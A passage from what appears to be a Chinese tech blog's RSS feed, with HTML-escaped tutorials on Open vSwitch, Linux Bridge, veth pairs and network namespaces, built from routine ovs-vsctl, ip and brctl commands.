&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ovs-vsctl add-br br-int
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 请修改eth1为当前实验环境的业务网卡名称&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int eth1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 添加两个内部端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet0 -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Interface vnet0 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet1 -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Interface vnet1 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 添加两个netns&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 将内部端口分别移动到netns中&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet0 netns ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet1 netns ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 启动端口并配置IP&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet0 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip addr add 10.0.0.3/24 dev vnet0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet1 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip addr add 10.0.0.4/24 dev vnet1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="测试">测试&lt;/h3>
&lt;ul>
&lt;li>测试 &lt;code>主机A&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ping 10.0.0.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ping 10.0.0.4
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ping 10.0.0.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ping 10.0.0.4
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>测试 &lt;code>主机B&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ping 10.0.0.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ping 10.0.0.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ping 10.0.0.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ping 10.0.0.2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>测试结果&lt;/li>
&lt;/ul>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>主机A&lt;/th>
 &lt;th>主机B&lt;/th>
 &lt;th>ping 结果&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ns0&lt;/td>
 &lt;td>ns0&lt;/td>
 &lt;td>可通信 ✅&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>ns0&lt;/td>
 &lt;td>ns1&lt;/td>
 &lt;td>可通信 ✅&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>ns1&lt;/td>
 &lt;td>ns0&lt;/td>
 &lt;td>可通信 ✅&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>ns1&lt;/td>
 &lt;td>ns1&lt;/td>
 &lt;td>可通信 ✅&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;p>根据测试结果可以看到我们使用OVS成功的联通了分布在不同主机上的虚拟网络设备。&lt;/p></description></item><item><title>Open vSwitch 入门实践（2）使用OVS构建隔离网络</title><link>https://www.typesafe.cn/posts/ovs-learn-2/</link><pubDate>Thu, 26 Nov 2020 22:55:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-2/</guid><description>&lt;h1 id="前言">前言&lt;/h1>
&lt;p>在前面我们已经使用Linux Bridge完成了多台网络设备的通信，但是它对于网络隔离的支持不是很好，长期以来，在Linux平台上缺少一个功能完备的虚拟交换机，直到OVS的出现。&lt;/p>
&lt;h1 id="实验">实验&lt;/h1>
&lt;p>接下来我们来尝试完成两个实验，单机无隔离网络、单机隔离网络。&lt;/p>
&lt;h2 id="实验一单机无隔离网络">实验一：单机无隔离网络&lt;/h2>
&lt;p>使用ovs构建无隔离网络非常简单，只需要添加一个网桥，然后在这个网桥上再增加几个内部端口，最后把端口移动到netns中即可。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 添加网桥&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-br br-int
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 添加三个内部端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet0 -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Interface vnet0 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet1 -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Interface vnet1 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet2 -- &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> Interface vnet2 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 添加三个netns&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 将内部端口分别移动到netns中&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet0 netns ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet1 netns ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet2 netns ns2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 启动端口并配置IP&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet0 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip addr add 10.0.0.1/24 dev vnet0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet1 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip addr add 10.0.0.2/24 dev vnet1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns2 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns2 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> vnet2 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns2 ip addr add 10.0.0.3/24 dev vnet2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>测试&lt;/p></description></item><item><title>Open vSwitch 入门实践（1）Open vSwitch 是什么</title><link>https://www.typesafe.cn/posts/ovs-learn-1/</link><pubDate>Wed, 25 Nov 2020 17:49:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-1/</guid><description>&lt;h1 id="ovs简介">OVS简介&lt;/h1>
&lt;h3 id="open-vswitch-是什么">Open vSwitch 是什么？&lt;/h3>
&lt;p>Open vSwitch(以下简称OVS)是一个用C语言开发的多层虚拟交换机，使用Apcahe 2开源许可证，现如今基本上已经成为了开源SDN（软件定义网络）基础设施层的事实标准。&lt;/p>
&lt;h3 id="ovs支持哪些功能">OVS支持哪些&lt;a href="http://www.openvswitch.org//features/">功能&lt;/a>？&lt;/h3>
&lt;ul>
&lt;li>支持NetFlow、sFlow(R)、IPFIX、SPAN、RSPAN和GRE隧道镜像等多种流量监控协议&lt;/li>
&lt;li>支持LACP (IEEE 802.1AX-2008)&lt;/li>
&lt;li>支持标准802.1Q VLAN协议，允许端口配置trunk模式&lt;/li>
&lt;li>支持组播&lt;/li>
&lt;li>支持BFD和802.1ag链路监控&lt;/li>
&lt;li>支持STP（IEEE 802.1D-1998）和RSTP（IEEE 802.1D-2004）&lt;/li>
&lt;li>支持细粒度的QoS（服务质量）配置&lt;/li>
&lt;li>支持HFSC qdisc&lt;/li>
&lt;li>支持接管每一个虚拟机的流量&lt;/li>
&lt;li>支持基于源MAC的负载均衡、主备模式和L4哈希的端口绑带&lt;/li>
&lt;li>支持OpenFlow协议（包含了很多对虚拟化的扩展）&lt;/li>
&lt;li>支持IPv6&lt;/li>
&lt;li>支持多种隧道协议（GRE、VXLAN、STT、Geneve和IPsec）&lt;/li>
&lt;li>支持C和Python的远程配置协议&lt;/li>
&lt;li>支持内核和用户空间的转发引擎选项&lt;/li>
&lt;li>具有流缓存引擎的多表转发管道&lt;/li>
&lt;li>转发层抽象以简化向新软件和硬件平台的移植&lt;/li>
&lt;/ul>
&lt;h1 id="ovs的术语解释">OVS的术语解释&lt;/h1>
&lt;h3 id="bridge">Bridge&lt;/h3>
&lt;p>中文名称&lt;strong>网桥&lt;/strong>，一个Bridge代表一个以太网交换机（Switch），一台主机中可以创建一个或多个Bridge，Bridge可以根据一定的规则，把某一个端口接收到的数据报文转发到另一个或多个端口上，也可以修改或者丢弃数据报文。&lt;/p>
&lt;h3 id="port">Port&lt;/h3>
&lt;p>中文名称&lt;strong>端口&lt;/strong>，需要注意的是它和TCP里面的端口不是同样的概念，它更像是物理交换机上面的插口，可以接水晶头的那种。Port隶属于Bridge，必须先添加了Bridge才能在Bridge上添加Port。Port有以下几种类型：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>Normal&lt;/strong>&lt;/p>
&lt;p>用户可以把操作系统中已有的网卡添加到Open vSwicth上，Open vSwitct会自动生成一个同名的Port开处理这张网卡进和出的数据报文。&lt;/p>
&lt;blockquote>
&lt;p>不过需要注意的是这种方式添加的Port不支持分配IP地址，如果之前网卡上配置的有IP，挂载到OVS上面之后将不可访问。此类型的Port常用于VLAN模式的多台物理主机相连的那个口，交换机一端属于Trunk模式。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Internal&lt;/strong>&lt;/p>
&lt;p>当Port的类型是Internal时，OVS会自动创建一个虚拟网卡（Interface），此端口收到的数据报文都会转发给这块网卡，从这块网卡发出的数据报文也会通过Port交给OVS处理。当OVS创建一个新的网桥时，会自动创建一个与网桥同名的Internal Port，同时也会创建一个与网桥同名的Interface，因此可以通过ip命令在操作系统中查看到这张虚拟网卡，但是状态是down的。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Patch&lt;/strong>&lt;/p>
&lt;p>Patch Port和veth pair功能相同，总是成双成对的出现，在其中一端收到的数据报文会被转发到另一个Patch Port上，就像是一根网线一样。Patch Port常用于连接两个Bridge，这样两个网桥就和一个网桥一样了。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Tunnel&lt;/strong>&lt;/p>
&lt;p>OVS 支持 GRE、VXLAN、STT、Geneve和IPsec隧道协议，这些隧道协议就是overlay网络的基础协议，通过对物理网络做的一层封装和扩展，解决了二层网络数量不足的问题，最大限度的减少对底层物理网络拓扑的依赖性，同时也最大限度的增加了对网络的控制。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="interface">Interface&lt;/h3>
&lt;p>（iface/接口）接口是OVS与操作系统交换数据报文的组件，一个接口即是操作系统上的一块网卡，这个网卡可能是OVS生成的虚拟网卡，也有可能是挂载在OVS上的物理网卡，操作系统上的虚拟网卡（TUN/TAP）也可以被挂载在OVS上。&lt;/p>
&lt;h3 id="controller">Controller&lt;/h3>
&lt;p>OpenFlow控制器，OVS可以接收一个或者多个OpenFlow控制器的管理，功能主要是下发流表，控制转发规则。&lt;/p>
&lt;h3 id="flow">Flow&lt;/h3>
&lt;p>流表是OVS进行数据转发的核心功能，定义了端口之间转发数据报文的规则，一条流表规则主要分为匹配和动作两部分，匹配部分决定哪些数据报文需要被处理，动作决定了匹配到的数据报文该如何处理。&lt;/p>
&lt;h1 id="ovs常用操作">OVS常用操作&lt;/h1>
&lt;h3 id="安装">安装&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install openvswitch
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>systemctl &lt;span style="color:#8be9fd;font-style:italic">enable&lt;/span> openvswitch
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>systemctl start openvswitch
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>如果当前软件源中没有openvswitch，可以通过&lt;a href="https://developer.aliyun.com/packageSearch?word=openvswitch">阿里云官方镜像站&lt;/a>下载和操作系统版本对应的rpm包到本地再安装。 示例命令： &lt;code>yum localinstall openvswitch-2.9.0-3.el7.x86_64.rpm&lt;/code>&lt;/p></description></item><item><title>Linux Bridge 详解</title><link>https://www.typesafe.cn/posts/linux-bridge/</link><pubDate>Fri, 13 Nov 2020 21:47:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-bridge/</guid><description>&lt;h1 id="linux-bridge-详解">Linux Bridge 详解&lt;/h1>
&lt;p>Linux Bridge（网桥）是用纯软件实现的虚拟交换机，有着和物理交换机相同的功能，例如二层交换，MAC地址学习等。因此我们可以把tun/tap，veth pair等设备绑定到网桥上，就像是把设备连接到物理交换机上一样。此外它和veth pair、tun/tap一样，也是一种虚拟网络设备，具有虚拟设备的所有特性，例如配置IP，MAC地址等。&lt;/p>
&lt;p>Linux Bridge通常是搭配KVM、docker等虚拟化技术一起使用的，用于构建虚拟网络，因为此教程不涉及虚拟化技术，我们就使用前面学习过的netns来模拟虚拟设备。&lt;/p>
&lt;h2 id="如何使用linux-bridge">如何使用Linux Bridge？&lt;/h2>
&lt;p>操作网桥有多种方式，在这里我们介绍一下通过&lt;strong>bridge-utils&lt;/strong>来操作，由于它不是Linux系统自带的工具，因此需要我们手动来安装它。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># centos&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>yum install -y bridge-utils
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># ubuntu&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt-get install -y bridge-utils
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用&lt;code>brctl help&lt;/code>查看使用帮助&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>never heard of &lt;span style="color:#8be9fd;font-style:italic">command&lt;/span> &lt;span style="color:#ff79c6">[&lt;/span>help&lt;span style="color:#ff79c6">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Usage: brctl &lt;span style="color:#ff79c6">[&lt;/span>commands&lt;span style="color:#ff79c6">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commands:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	addbr 	&amp;lt;bridge&amp;gt;		add bridge
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	delbr 	&amp;lt;bridge&amp;gt;		delete bridge
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	addif 	&amp;lt;bridge&amp;gt; &amp;lt;device&amp;gt;	add interface to bridge
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	delif 	&amp;lt;bridge&amp;gt; &amp;lt;device&amp;gt;	delete interface from bridge
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	hairpin 	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &lt;span style="color:#ff79c6">{&lt;/span>on|off&lt;span style="color:#ff79c6">}&lt;/span>	turn hairpin on/off
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setageing 	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> ageing &lt;span style="color:#8be9fd;font-style:italic">time&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setbridgeprio	&amp;lt;bridge&amp;gt; &amp;lt;prio&amp;gt;		&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> bridge priority
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setfd 	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> bridge forward delay
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	sethello 	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> hello &lt;span style="color:#8be9fd;font-style:italic">time&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setmaxage 	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> max message age
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setpathcost	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &amp;lt;cost&amp;gt;	&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> path cost
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setportprio	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &amp;lt;prio&amp;gt;	&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> port priority
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	show 	&lt;span style="color:#ff79c6">[&lt;/span> &amp;lt;bridge&amp;gt; &lt;span style="color:#ff79c6">]&lt;/span>		show a list of bridges
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	showmacs 	&amp;lt;bridge&amp;gt;		show a list of mac addrs
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	showstp 	&amp;lt;bridge&amp;gt;		show bridge stp info
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	stp 	&amp;lt;bridge&amp;gt; &lt;span style="color:#ff79c6">{&lt;/span>on|off&lt;span style="color:#ff79c6">}&lt;/span>	turn stp on/off
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>常用命令如&lt;/p></description></item><item><title>Linux veth pair 详解</title><link>https://www.typesafe.cn/posts/linux-veth-pair/</link><pubDate>Mon, 09 Nov 2020 22:45:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-veth-pair/</guid><description>&lt;h1 id="linux-veth-pair-详解">Linux veth pair 详解&lt;/h1>
&lt;p>veth pair是成对出现的一种虚拟网络设备接口，一端连着网络协议栈，一端彼此相连。如下图所示：&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/virtual-device-veth-1.png" alt="virtual-device-veth-1">&lt;/p>
&lt;p>由于它的这个特性，常常被用于构建虚拟网络拓扑。例如连接两个不同的网络命名空间(netns)，连接docker容器，连接网桥(Bridge)等，其中一个很常见的案例就是OpenStack Neutron底层用它来构建非常复杂的网络拓扑。&lt;/p>
&lt;h2 id="如何使用">如何使用？&lt;/h2>
&lt;p>创建一对veth&lt;/p>
&lt;pre tabindex="0">&lt;code>ip link add &amp;lt;veth name&amp;gt; type veth peer name &amp;lt;peer name&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="实验">实验&lt;/h2>
&lt;p>我们改造上一节完成的netns实验，使用veth pair将两个的隔离netns连接起来。如下图所示：&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vethpair.png" alt="https://oss.typesafe.cn/vethpair.png">&lt;/p>
&lt;p>我们首先创建一对veth设备，将veth设备分别移动到两个netns中并启动。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 创建一对veth&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link add veth0 &lt;span style="color:#8be9fd;font-style:italic">type&lt;/span> veth peer name veth1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 将veth移动到netns中&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> veth0 netns ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> veth1 netns ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 启动&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns0 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> veth0 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> ns1 ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> veth1 up
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>接下来我们测试一下。&lt;/p>
&lt;p>使用&lt;code>ip netns exec ns0 ping 10.0.0.2&lt;/code>在命名空间ns0中测试与tap1的网络连通性。&lt;/p></description></item><item><title>Linux Network Namespace (netns) 详解</title><link>https://www.typesafe.cn/posts/linux-netns/</link><pubDate>Sun, 08 Nov 2020 23:12:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-netns/</guid><description>&lt;p>Network Namespace （以下简称netns）是Linux内核提供的一项实现网络隔离的功能，它能隔离多个不同的网络空间，并且各自拥有独立的网络协议栈，这其中便包括了网络接口（网卡），路由表，iptables规则等。例如大名鼎鼎的docker便是基于netns实现的网络隔离，今天我们就来手动实验一下netns的隔离特性。&lt;/p>
&lt;h3 id="使用方式">使用方式&lt;/h3>
&lt;p>使用&lt;code>ip netns help&lt;/code>查看使用帮助&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Usage: ip netns list
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns add NAME
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> NAME NETNSID
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#ff79c6">[&lt;/span>-all&lt;span style="color:#ff79c6">]&lt;/span> netns delete &lt;span style="color:#ff79c6">[&lt;/span>NAME&lt;span style="color:#ff79c6">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns identify &lt;span style="color:#ff79c6">[&lt;/span>PID&lt;span style="color:#ff79c6">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns pids NAME
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#ff79c6">[&lt;/span>-all&lt;span style="color:#ff79c6">]&lt;/span> netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> &lt;span style="color:#ff79c6">[&lt;/span>NAME&lt;span style="color:#ff79c6">]&lt;/span> cmd ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns monitor
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns list-id
